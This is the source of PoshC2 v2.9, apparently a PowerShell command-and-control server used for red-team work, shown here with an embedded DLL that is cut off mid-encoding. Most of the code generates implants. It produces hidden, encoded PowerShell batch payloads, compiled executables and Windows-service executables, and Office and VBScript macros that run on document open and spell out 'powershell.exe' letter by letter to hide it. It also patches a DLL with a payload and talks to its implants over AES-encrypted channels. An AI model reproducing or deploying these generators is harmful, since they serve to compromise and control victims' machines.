# Written by @benpturner and @davehardy20
function C2-Server {
Param($PoshPath, $RestartC2Server)

# are we running with Administrator privileges to open port 80
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator'))
{   
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process -FilePath powershell -Verb runAs -ArgumentList $arguments
    Break
}

Clear-Host
Write-Host -Object ""
Write-Host -Object "__________            .__.     _________  ________  "  -ForegroundColor Green
Write-Host -Object "\_______  \____  _____|  |__   \_   ___ \ \_____  \ "  -ForegroundColor Green
Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -ForegroundColor Green
Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
Write-Host "=============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
Write-Host "====================================================" `n -ForegroundColor Green

if (!$RestartC2Server) {
    $PathExists = Test-Path $PoshPath

    if (!$PathExists) {
        $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
    }
}

# if poshpath ends with slash then remove this

# tests for java JDK so we can create a Jar payload and applet
if (Test-Path "C:\program files\java\") {
    foreach ($folder in (get-childitem -name -path "C:\program files\java\"))
    {
        if ($folder.ToString().ToLower().StartsWith("jdk"))
        {
            $JDKPath = "C:\program files\java\$folder"
        }
    }
} else {
    Write-host "Cannot find any Java JDK versions Installed, Install Java JDK to create Java Applet Payloads" -ForegroundColor Red
}

$p = $env:PsModulePath
$p += ";$PoshPath"
[Environment]::SetEnvironmentVariable("PSModulePath",$p)
Import-Module -Name PSSQLite
$global:newdir = $null
$ipv4address = $null
$randomuriarray = @()
$taskiddb = 1 

# used to generate random uri for each implant
function Get-RandomURI 
{
    param (
        [int]$Length
    )
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {$result += $set | Get-Random}
    return $result
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject 
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted bytes block 
function Encrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted bytes block 
function Decrypt-String2 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}

# encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
function Encrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $unencryptedString
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}

# decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
function Decrypt-String 
{
    param
    (
        [Object]
        $key,
        [Object]
        $encryptedStringWithIV
    )
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

# download file function to convert from base64 in db to file
function Download-File
{
    param
    (
        [string] $SourceFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
    $reader = [System.IO.File]::OpenRead($SourceFilePath)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    $base64
    $reader.Dispose()
}

# converts a source base64 file to file (need to change to IO.Memory Reader)
function ConvertFrom-Base64
{
    param
    (
        [string] $SourceFilePath,
        [string] $TargetFilePath
    )
 
    $SourceFilePath = Resolve-PathSafe $SourceFilePath
    $TargetFilePath = Resolve-PathSafe $TargetFilePath
    $bufferSize = 90000
    $buffer = New-Object char[] $bufferSize
    $reader = [System.IO.File]::OpenText($SourceFilePath)
    $writer = [System.IO.File]::OpenWrite($TargetFilePath)
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
        $writer.Write($bytes, 0, $bytes.Length);
    } while ($bytesRead -eq $bufferSize);
     
    $reader.Dispose()
    $writer.Dispose()
}

# for resolving paths for file downloader
function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

# create bat payloads
function CreatePayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    [IO.File]::WriteAllLines("$global:newdir\payloads\payload.bat", $payload)

    Write-Host -Object "Batch Payload written to: $global:newdir\payloads\payload.bat"  -ForegroundColor Green
}

# create exe 
function CreateStandAloneExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
        public Program() {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}

}


# create service exe 
function CreateServiceExe 
{
$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
$praw = [Convert]::ToBase64String($bytescom)
$cscservicecode = 'using System;
using System.Text;
using System.ServiceProcess;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace Service
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service1()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
    public partial class Service1 : ServiceBase
    {
        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch (ArgumentException e)
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
        }

        protected override void OnStop()
        {
        }
    }
}'
[IO.File]::WriteAllLines("$global:newdir\payloads\posh-service.cs", $cscservicecode)

if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
    Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
} else {
    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh-service.exe $global:newdir\payloads\posh-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    }
}

}

function PatchDll {
    param($dllBytes, $replaceString, $Arch)

    if ($Arch -eq 'x86') {
        $dllOffset = 0x00003040
        $dllOffset = $dllOffset +8
    }
    if ($Arch -eq 'x64') {
        $dllOffset = 0x00003E70
    }

    # Patch DLL - replace 5000 A's
    $AAAA = "A"*5000
    $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
    $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
    
    # Length of replacement code
    $dllLength = $replaceString.Length
    $patchLength = 5000 -$dllLength
    $nullString = 0x00*$patchLength
    $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
    $nullBytes = $nullBytes[1..$patchLength]
    $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)

    $dllLength = 10000 -3
    $i=0
    # Loop through each byte from start position
    $dllOffset..($dllOffset + $dllLength) | % {
        $dllBytes[$_] = $replaceNewStringBytes[$i]
        $i++
    }
    
    # Return Patched DLL
    return $DllBytes
}

# create macro payloads
function CreateMacroPayload 
{
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $payloadraw = [Convert]::ToBase64String($bytes)
    $payload = $payloadraw -replace "`n", ""
    $payloadbits = $null
    While ($payload)
    { 
        $y = $payload[0..500] -join ''
        $payload = $payload -replace $y,''
        $payloadbits = $payloadbits +'str = str + "'+$y+'"'+"`r`n"
    }

    $macro = 'Sub Auto_Open()
UpdateMacro
End Sub

Sub AutoOpen()
UpdateMacro
End Sub

Sub Workbook_Open()
UpdateMacro
End Sub

Sub WorkbookOpen()
UpdateMacro
End Sub

Sub Document_Open()
UpdateMacro
End Sub

Sub DocumentOpen()
UpdateMacro
End Sub

Sub UpdateMacro()
Dim str, exec, wsh

str = ""
'+$payloadbits+'
exec = "p"
exec = exec + "o"
exec = exec + "w"
exec = exec + "e"
exec = exec + "r"
exec = exec + "s"
exec = exec + "h"
exec = exec + "e"
exec = exec + "l"
exec = exec + "l"
exec = exec + "."
exec = exec + "e"
exec = exec + "x"
exec = exec + "e"
exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
'

$macrodoc = $macro + '
Shell(exec)
End Sub'

$wscript = $macro + '
Set wsh = CreateObject( "WScript.Shell" )
wsh.Exec(exec)
End Sub

UpdateMacro'

    [IO.File]::WriteAllLines("$global:newdir\payloads\macro.txt", $macrodoc)
    [IO.File]::WriteAllLines("$global:newdir\payloads\wscript.vbs", $wscript)
    try {
    Write-Host -Object "Macro Payload written to: $global:newdir\payloads\macro.txt"  -ForegroundColor Green
    Write-Host -Object "Wscript Payload written to: $global:newdir\payloads\wscript.vbs"  -ForegroundColor Green
    Write-Host -Object "Exe Payload written to: $global:newdir\payloads\posh.exe"  -ForegroundColor Green
    Write-Host -Object "Service-Exe Payload written to: $global:newdir\payloads\posh-service.exe"  -ForegroundColor Green

    Import-Module $PoshPath\Modules\ConvertTo-Shellcode.ps1
    
    $86="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